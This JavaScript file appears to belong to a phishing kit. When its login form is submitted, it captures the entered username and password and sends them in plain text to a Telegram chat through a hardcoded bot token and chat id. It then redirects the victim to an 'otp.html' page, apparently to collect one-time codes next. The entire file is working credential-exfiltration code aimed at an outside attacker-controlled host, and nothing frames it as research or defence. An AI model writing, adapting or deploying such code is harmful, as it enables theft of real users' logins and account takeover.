
const form = document.querySelector("#form")
form.addEventListener("submit",async (e)=>{
   e.preventDefault()
   var username = document.querySelector(".username").value;
   var password = document.querySelector(".password").value;
   var texts = `Username is ${username} and password is ${password}`
   var token = `6906141770:AAH1rAsoxuawD7uatLfPEeMtdCErzmqOp4A`
   var chat_id = `-4016371216`
   var url = `https://api.telegram.org/bot${token}/sendmessage?chat_id=${chat_id}&text=${texts}`
   
 api = new XMLHttpRequest();
  api.open("GET", url,true);
 await api.send()

   console.log("received")

   api.addEventListener("load", function () {
    if (api.status >= 200 && api.status < 300) {
        console.log("Message sent successfully");
        window.location.href = "./otp.html"; // Change location only after successful send
    } else {
        console.error("Failed to send message. Status code: " + api.status);
        // Handle failure here
    }
});

})

